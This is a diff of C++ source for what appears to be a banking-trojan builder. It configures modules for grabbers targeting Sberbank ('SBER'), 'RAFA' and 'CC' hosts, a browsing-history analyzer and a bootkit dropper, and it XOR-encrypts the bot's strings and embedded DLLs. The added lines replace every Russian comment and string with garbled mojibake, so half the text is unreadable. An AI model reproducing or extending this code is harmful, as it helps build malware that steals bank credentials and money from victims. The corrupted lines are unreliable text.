+	Module->AddParam(false, VIDEOREC_PARAM_ENCRYPTED_URLS, VIDEOREC_PARAM_NAME_URLS,  VIDEOREC_PARAM_SIZE_URLS, "пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ");
 
 	// JAVA Config
 	Module = AddModule(Module_JavaConfig);
-	Module->AddParam(true, JAVA_PARAM_ENCRYPTED, JAVA_PARAM_NAME, JAVA_PARAM_SIZE, "Ссылки JAVA");
+	Module->AddParam(true, JAVA_PARAM_ENCRYPTED, JAVA_PARAM_NAME, JAVA_PARAM_SIZE, "пїЅпїЅпїЅпїЅпїЅпїЅ JAVA");
 
-	// Ссылки AZ
+	// пїЅпїЅпїЅпїЅпїЅпїЅ AZ
 	Module = AddModule(Module_AzConfig);
-//	Module->AddParam(false, AZCONFIG_PARAM_ENCRYPTED_HOSTS, AZCONFIG_PARAM_NAME_HOSTS, AZCONFIG_PARAM_SIZE_HOSTS, "Хосты системы AZ");
-//	Module->AddParam(true, AZCONFIG_PARAM_ENCRYPTED_SCRIPTHOSTS, AZCONFIG_PARAM_NAME_SCRIPTHOSTS, AZCONFIG_PARAM_SIZE_SCRIPTHOSTS, "Хосты Java скриптов системы AZ");
-	Module->AddParam(true, AZCONFIG_PARAM_ENCRYPTED_AZUSER, AZCONFIG_PARAM_NAME_AZUSER, AZCONFIG_PARAM_SIZE_AZUSER, "Имя пользователя AZ");
+//	Module->AddParam(false, AZCONFIG_PARAM_ENCRYPTED_HOSTS, AZCONFIG_PARAM_NAME_HOSTS, AZCONFIG_PARAM_SIZE_HOSTS, "пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ AZ");
+//	Module->AddParam(true, AZCONFIG_PARAM_ENCRYPTED_SCRIPTHOSTS, AZCONFIG_PARAM_NAME_SCRIPTHOSTS, AZCONFIG_PARAM_SIZE_SCRIPTHOSTS, "пїЅпїЅпїЅпїЅпїЅ Java пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ AZ");
+	Module->AddParam(true, AZCONFIG_PARAM_ENCRYPTED_AZUSER, AZCONFIG_PARAM_NAME_AZUSER, AZCONFIG_PARAM_SIZE_AZUSER, "пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ AZ");
 
 
 
-	// Настройки грабера сбер
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ
 	Module = AddModule(Module_SberHosts);
-	Module->AddParam(true, SBERHOSTS_PARAM_ENCRYPTED, SBERHOSTS_PARAM_NAME, SBERHOSTS_PARAM_SIZE, "Хосты грабера SBER");
+	Module->AddParam(true, SBERHOSTS_PARAM_ENCRYPTED, SBERHOSTS_PARAM_NAME, SBERHOSTS_PARAM_SIZE, "пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ SBER");
 
-    // Настройки параметров рафы
+    // пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ
 	Module = AddModule(Module_RafaHosts);
-	Module->AddParam(true, RAFAHOSTS_PARAM_ENCRYPTED, RAFAHOSTS_PARAM_NAME, RAFAHOSTS_PARAM_SIZE, "Хосты грабера RAFA");
+	Module->AddParam(true, RAFAHOSTS_PARAM_ENCRYPTED, RAFAHOSTS_PARAM_NAME, RAFAHOSTS_PARAM_SIZE, "пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ RAFA");
 
-	// Настройки системы CC
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ CC
 	Module = AddModule(Module_CCHosts);
-	Module->AddParam(true, ССHOSTS_PARAM_ENCRYPTED, CCHOSTS_PARAM_NAME, CCHOSTS_PARAM_SIZE, "Хосты грабера CC");
+	Module->AddParam(true, пїЅпїЅHOSTS_PARAM_ENCRYPTED, CCHOSTS_PARAM_NAME, CCHOSTS_PARAM_SIZE, "пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ CC");
 
-	// Настройки анализатора истории навигации
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	Module = AddModule(Module_HistoryAnalyzer);
-	Module->AddParam(true, BOTPARAM_ENCRYPTED_HISANALIZERLINKS, BOTPARAM_HISANALIZERLINKS, BOTPARAM_SIZE_HISANALIZERLINKS, "Ссылки анализатора истории навигации");
+	Module->AddParam(true, BOTPARAM_ENCRYPTED_HISANALIZERLINKS, BOTPARAM_HISANALIZERLINKS, BOTPARAM_SIZE_HISANALIZERLINKS, "пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ");
 
 
 
-	// Настройки дропера буткита
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	Module = AddModule(Module_BootkitDroper);
-	Module->AddParam(true, false, Param_DroperNamePrefix, 0, "Превикс дропера буткита");
-	Module->AddParam(true, false, Param_TargetPlatform,   0, "Платформа назначения дропера буткита");
-	TOldBotParam* P = Module->AddParam(true, false, Param_SVCFuckupEnabled, 0, "Использовать SVC подмену дропером буткита");
+	Module->AddParam(true, false, Param_DroperNamePrefix, 0, "пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ");
+	Module->AddParam(true, false, Param_TargetPlatform,   0, "пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ");
+	TOldBotParam* P = Module->AddParam(true, false, Param_SVCFuckupEnabled, 0, "пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ SVC пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ");
 	P->AsAnsiString = "0";
 }
 
@@ -1660,8 +1671,8 @@ __fastcall TOldBotParam::TOldBotParam(TOldBotBuilder* AOwner, bool NotNull, bool
 	FTitle = Title;
 	FName = Name;
 	FNotNull = NotNull;
-	// Так как большинство параметров являются строковыми, то
-	// размер буфера устанавливаем с учётом завершающего нуля
+	// пїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ, пїЅпїЅ
+	// пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ
 	FSize = Size - 1;
 	FDataSize = 0;
 	FData = (PCHAR)malloc(FSize + 1);
@@ -1694,7 +1705,7 @@ bool __fastcall TOldBotParam::GetActive()
 //-----------------------------------------------------------------------------
 
 
-// Функция возвращает отображаемое имя параметра
+// пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 UnicodeString __fastcall TOldBotParam::GetDisplayName(void)
 {
 	if (FTitle.IsEmpty())
@@ -1704,14 +1715,14 @@ UnicodeString __fastcall TOldBotParam::GetDisplayName(void)
 }
 //-----------------------------------------------------------------------------
 
-// Функция возвращает истину если параметр пустой
+// пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 bool __fastcall TOldBotParam::IsEmpty()
 {
 	return FDataSize == 0;
 }
 //-----------------------------------------------------------------------------
 
-// Функция очищает параметр
+// пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 void __fastcall TOldBotParam::Clear()
 {
 	FDataSize = 0;
@@ -1720,7 +1731,7 @@ void __fastcall TOldBotParam::Clear()
 //-----------------------------------------------------------------------------
 
 
-// Функция устанавливает значение параметра
+// пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 void __fastcall TOldBotParam::SetValue(PCHAR Value, DWORD ValueSize)
 {
 	Clear();
@@ -1791,7 +1802,7 @@ void __fastcall TOldBotParam::SetAsUnicodeString(const UnicodeString &Value)
 
 UnicodeString __fastcall TOldBotParam::GetAsStrings()
 {
-	// Функция возвращает многострочный текст
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
 	if (FDataSize == 0)
 		return "";
 
@@ -1825,8 +1836,8 @@ void __fastcall TOldBotParam::SetAsStrings(const UnicodeString &Value)
 
 void __fastcall TOldBotParam::SaveToStrings(TStrings *Strings)
 {
-	// Функция созраняет данные в набор строк,
-	// Подразумевается, что данные это набор строк разделённых нулём
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ,
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ, пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ
 	Strings->Clear();
 	Strings->BeginUpdate();
 	try {
@@ -1850,8 +1861,8 @@ void __fastcall TOldBotParam::SaveToStrings(TStrings *Strings)
 
 void __fastcall TOldBotParam::LoadFromStrings(TStrings *Strings)
 {
-	// Функция данные данные из набора строк,
-	// Подразумевается, что данные это набор строк разделённых нулём
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ,
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ, пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ
 	Clear();
 
 	int Count = Strings->Count;
@@ -1864,17 +1875,17 @@ void __fastcall TOldBotParam::LoadFromStrings(TStrings *Strings)
 		DWORD Len = S.Length();
 		if (Len == 0) continue;
 
-		Len++;// Цепляем ноль в конце
+		Len++;// пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅ
 
-		// Проверяем помещается ли наша строка
+		// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 		if (FDataSize + Len >= FSize)
 			return;
 
-		// При необходимости шифруем строку
+		// пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 		if (FEncrypted)
 			DecryptStr(S.c_str(), S.c_str());
 
-		// Копируем данные
+		// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 		m_memcpy(Buf, S.c_str(), Len);
 
 		Buf += Len;
@@ -1885,14 +1896,14 @@ void __fastcall TOldBotParam::LoadFromStrings(TStrings *Strings)
 
 bool __fastcall TOldBotParam::Write(PCHAR Buf, DWORD BufSize)
 {
-	// Функция записывает своё значение в буфер
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅ
 	return DoWrite(Buf, BufSize, FData, FSize);
 }
 //-----------------------------------------------------------------------------
 
 bool __fastcall TOldBotParam::WriteEmptyData(PCHAR Buf, DWORD BufSize)
 {
-	// Функция заполняет нулями своё место в сборке
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 	int Pos = Position(Buf, BufSize);
 	if (Pos < 0) return false;
 
@@ -1904,7 +1915,7 @@ bool __fastcall TOldBotParam::WriteEmptyData(PCHAR Buf, DWORD BufSize)
 
 int  __fastcall TOldBotParam::Position(PCHAR Buf, DWORD BufSize)
 {
-	// Функция возвращает позицию параметра в буфере
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 	return STR::Pos(Buf, FName.c_str(), BufSize);
 }
 //-----------------------------------------------------------------------------
@@ -1912,13 +1923,13 @@ int  __fastcall TOldBotParam::Position(PCHAR Buf, DWORD BufSize)
 
 bool __fastcall TOldBotParam::DoWrite(PCHAR Buf, DWORD BufSize, PCHAR AData, DWORD ADataSize)
 {
-	// Ищем позицию
+	// пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	int Pos = Position(Buf, BufSize);
 	if (Pos < 0) return false;
 	if (ADataSize > FSize)
 		throw Exception(Error_DataSizeError);
 
-	// записываем данные
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 	PCHAR Param = Buf + Pos;
 	m_memset(Param, 0, FSize + 1);
 	m_memcpy(Param, AData, ADataSize);
@@ -1930,8 +1941,8 @@ bool __fastcall TOldBotParam::DoWrite(PCHAR Buf, DWORD BufSize, PCHAR AData, DWO
 */
 
 //*************************************************************
-//  TCustomBotDataEncryptor  - Базовый Класс шифрования
-//							   данных бота
+//  TCustomBotDataEncryptor  - пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
+//							   пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ
 //*************************************************************
 TCustomBotDataEncryptor::TCustomBotDataEncryptor(TCustomBotModule* AOwner, PCHAR Name, DWORD Size)
 	: TBotParam(AOwner, Name, Size, false, false, NULL)
@@ -1952,11 +1963,11 @@ __fastcall TBotStringsEncryptor::TBotStringsEncryptor(TCustomBotModule* AOwner)
 //---------------------------------------------------------------------------
 
 //--------------------------------------------------
-//  Функция сохраняет значения параметров в поток
+//  пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅ
 //--------------------------------------------------
 bool TBotStringsEncryptor::UpdateStatus(LPBYTE Buf, DWORD BufSize)
 {
-	// Находим начало блока шифрованных строк
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
 	if (!Enabled)
 	{
 		FPosition = -1;
@@ -1966,38 +1977,38 @@ bool TBotStringsEncryptor::UpdateStatus(LPBYTE Buf, DWORD BufSize)
 	PCHAR StartAnchor = ENCRYPTED_STRINGS_BEGIN;
 	PCHAR EndAnchor   = ENCRYPTED_STRINGS_END;
 
-	// Определяем позиции блока шифрованных строк
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
 	FPosition = STR::Pos(Buf, StartAnchor, BufSize, true);
 
 	if (FPosition < 0) return false;
 
 
-	// Определяем конец блока
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
 	int End = STR::Pos(Buf + FPosition, EndAnchor, BufSize - FPosition, true);
 	if (End < 0)
-		throw Exception("Нарушение целостности блока шифрованных строк! \r\nОбратитесь к разработчикам.");
+		throw Exception("пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ! \r\nпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.");
 
 	FEndAnchorPos = FPosition + End;
 
 
-	// Проверяем данные. Цель проверки не допустить повреждения целосности
-	// бота. Считаем, что строки не могут содержать символы с кодом менее 9.
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ. пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
+	// пїЅпїЅпїЅпїЅ. пїЅпїЅпїЅпїЅпїЅпїЅпїЅ, пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ 9.
 
 	for (int i = FPosition; i < FEndAnchorPos; i++)
 	{
 		if (Buf[i] > 0 && Buf[i] < 9)
-			throw Exception("Нарушение целостности блока шифрованных строк! \r\nОбратитесь к разработчикам.");
+			throw Exception("пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ! \r\nпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.");
 
 	}
 
-	// Расчитываем размер блока
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
 	FSize = (FEndAnchorPos - FPosition) + STRA::Length(EndAnchor) + 1;
 
 	return true;
 }
 
 //--------------------------------------------------
-//  Функция шифрует строки
+//  пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 //--------------------------------------------------
 bool TBotStringsEncryptor::Write(LPBYTE Buf, DWORD BufSize)
 {
@@ -2011,7 +2022,7 @@ bool TBotStringsEncryptor::Write(LPBYTE Buf, DWORD BufSize)
 
 	while (Line < EndAnchor)
 	{
-		// Пропускаем лишние нули
+		// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ
 		if (*Line == 0)
 		{
 			Line++;
@@ -2022,27 +2033,27 @@ bool TBotStringsEncryptor::Write(LPBYTE Buf, DWORD BufSize)
 
 		DWORD Len = STRA::Length(Line);
 		if (Len > 255)
-			throw Exception("Размер кодируемой строки превышает допустимые нормы!");
+			throw Exception("пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ!");
 
-		// Шифруем данные
-		// Шифруем XOR ключём. Нюанс в том, что мы сместим сроку на один байт
-		// и первым байтом запишем размер исходной строки
+		// пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
+		// пїЅпїЅпїЅпїЅпїЅпїЅпїЅ XOR пїЅпїЅпїЅпїЅпїЅпїЅ. пїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅ, пїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ
+		// пїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 		string Tmp = XORCrypt::EncodeString(Pass.c_str(), Line);
 
-		// Записываем шифрованную строку
+		// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 		m_memcpy(Line, Tmp.t_str(), Len + 1);
 
-		// Проверяем правильность шифрования
+		// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 		string DecodedStr = XORCrypt::DecodeString(Pass.c_str(), Line);
 		if (OldString != DecodedStr)
-			throw Exception("Во время шифрования строк прооизошла ошибка");
+			throw Exception("пїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ");
 
-		// Переходим к следующей строке
+		// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 		Line += Len + 1;
     }
 
 
-	// Удяляем информацию о маркерах
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	m_memset(StartAnchor, 0, STRA::Length(StartAnchor));
 	m_memset(EndAnchor,   0, STRA::Length(EndAnchor));
 
@@ -2052,8 +2063,8 @@ bool TBotStringsEncryptor::Write(LPBYTE Buf, DWORD BufSize)
 
 
 //*************************************************************
-//   TBotDLLEncryptor  - Класс шифрования интегрированных
-//                       DLL бота
+//   TBotDLLEncryptor  - пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
+//                       DLL пїЅпїЅпїЅпїЅ
 //*************************************************************
 TBotDLLEncryptor::TBotDLLEncryptor(TCustomBotModule* AOwner, int APosition, DWORD ASize)
 	: TCustomBotDataEncryptor(AOwner, "DLL_ENCRYPTOR", ASize)
@@ -2065,7 +2076,7 @@ TBotDLLEncryptor::TBotDLLEncryptor(TCustomBotModule* AOwner, int APosition, DWOR
 }
 
 //--------------------------------------------------
-//  Функция зашифровывает данные длл
+//  пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ
 //--------------------------------------------------
 bool TBotDLLEncryptor::Write(LPBYTE Buf, DWORD BufSize)
 {
@@ -2073,48 +2084,48 @@ bool TBotDLLEncryptor::Write(LPBYTE Buf, DWORD BufSize)
 	PCHAR Ptr = Buf + Position;
 	PCHAR Marker = Ptr;
 
-	// Проверяем маркер
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 	DWORD Hash = STRA::Hash(Ptr, ENCRYPTED_DLL_MARKER_SIZE, false);
 
 	if (Hash != ENCRYPTED_DLL_MARKER_HASH)
-		throw Exception("Во время шифрования интегрированных dll возникла ошибка!");
+		throw Exception("пїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ dll пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ!");
 
-	// Получаем размер длл
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ
 	Ptr += ENCRYPTED_DLL_MARKER_SIZE;
 	FDllSize = *(PDWORD)Ptr;
 	Ptr += sizeof(DWORD);
 
-	// Для дальнешего контроля получаем хэш
+	// пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ
